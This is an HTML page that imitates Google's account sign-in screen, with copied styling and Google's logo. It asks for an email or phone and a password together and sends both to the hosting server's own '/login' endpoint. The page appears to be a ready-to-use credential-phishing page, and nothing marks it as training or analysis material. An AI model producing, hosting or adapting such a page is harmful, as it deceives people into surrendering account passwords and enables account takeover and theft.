<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 360px; text-align: center; }
        .google-logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        p { font-size: 16px; color: #202124; margin-bottom: 24px; }
        input { width: 100%; padding: 13px 15px; margin-bottom: 10px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        input:focus { outline: none; border: 2px solid #1a73e8; padding: 12px 14px; }
        .btn-next { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; float: right; margin-top: 10px; }
        .footer-info { margin-top: 80px; font-size: 12px; color: #70757a; text-align: left; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="google-logo" alt="Google">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <form method="POST" action="/login">
            <input type="email" name="login" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            <div style="text-align: left; color: #1a73e8; font-size: 14px; font-weight: 500; margin-top: 5px; cursor: pointer;">Forgot email?</div>
            <div style="height: 40px; margin-top: 20px;">
                <button type="submit" class="btn-next">Next</button>
            </div>
        </form>
        <div class="footer-info">
            Not your computer? Use a Private browsing window to sign in. <br><br>
            <span style="color: #1a73e8; font-weight: 500;">Learn more</span>
        </div>
    </div>
</body>
</html>
